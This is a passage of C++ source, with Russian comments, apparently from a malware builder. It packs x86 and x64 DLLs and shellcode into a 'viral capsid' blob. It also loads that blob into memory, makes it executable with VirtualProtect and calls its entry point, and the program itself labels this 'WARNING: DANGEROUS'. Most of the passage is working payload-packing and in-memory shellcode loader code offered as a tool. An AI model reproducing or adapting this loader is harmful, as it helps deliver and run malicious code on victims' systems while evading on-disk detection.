			buf2file(L"x64.hm", (LPBYTE)x64_dll.lpBuf, x64_dll.dwBufSize);
		}

	} while (FALSE);

	if (x86_dll.lpBuf)
		delete[]x86_dll.lpBuf;
	if (x64_dll.lpBuf)
		delete[]x64_dll.lpBuf;
	if (x64_shellcode.lpBuf)
		delete[]x64_shellcode.lpBuf;
	if (x86_shellcode.lpBuf)
		delete[]x86_shellcode.lpBuf;
	if (x86_entryoffset.lpBuf)
		delete[]x86_entryoffset.lpBuf;
	if (x64_entryoffset.lpBuf)
		delete[]x64_entryoffset.lpBuf;

	if (capsid != nullptr)
		delete[]capsid;

	return bRet;
}

BOOL load_capsid()
{
	BOOL bRet = FALSE;
	blob capsid_raw;
	RtlSecureZeroMemory(&capsid_raw, sizeof(capsid_raw));
	do
	{
		if (!read2blob(L"capsid.bin", &capsid_raw))
			break;

		DWORD dwProtectOld;
		VirtualProtect(capsid_raw.lpBuf, capsid_raw.dwBufSize, PAGE_EXECUTE_READWRITE, &dwProtectOld);

		typedef VOID(WINAPI *fnEntry)(capsid_metadata *);

		capsid_metadata *capsid = (capsid_metadata*)capsid_raw.lpBuf;
#ifndef _WIN64
		printf("Loading from %d byte capsid x86 core size offset entry = 0x%x\n", capsid->size, capsid->offset_x86entry);
		fnEntry entry = (fnEntry)&capsid_raw.lpBuf[capsid->offset_x86entry];
		entry(capsid);
#else
		printf("Loading from %d byte capsid x64 core size offset entry = 0x%x\n", capsid->size, capsid->offset_x64entry);
		fnEntry entry = (fnEntry)&capsid_raw.lpBuf[capsid->offset_x64entry];
		entry(capsid);
#endif

		bRet = TRUE;

	} while (FALSE);
	return bRet;
}


int main()
{
	

	// по дефолту создавать HM Executable формат из PE
	BOOL bHiveExecutable = TRUE;
	
	// по дефолту шеллкод - TRUE
	BOOL bExternalShellcode = TRUE;

	PWCHAR pwCommandLine = GetCommandLineW();
	if (wcsstr(pwCommandLine, L"--load"))
	{
		MessageBoxA(0, "We are going to execute viral capsid in the memory", "WARNING: DANGEROUS", MB_ICONWARNING);
		printf("Loading existing capsid from capsid.bin\n");
		if (load_capsid())
			printf("OK!\n");
		Sleep(INFINITE);
	}
	else if (wcsstr(pwCommandLine, L"--gen"))
	{
		if (wcsstr(pwCommandLine, L"--pe"))
			bHiveExecutable = FALSE;
		else if (wcsstr(pwCommandLine, L"--hive"))
			bHiveExecutable = TRUE;

		if (wcsstr(pwCommandLine, L"--shellcode"))
			bExternalShellcode = TRUE;
		else if (wcsstr(pwCommandLine, L"--reflective"))
			bExternalShellcode = FALSE;
		
		printf("Generating new capsid from x86.dll and x64.dll in %s format\n", (bHiveExecutable) ? "HM Executable" : "Portable Executable");
		if (gen_capsid(bHiveExecutable, bExternalShellcode))
			printf("OK!\n");
	}

	return 0;
}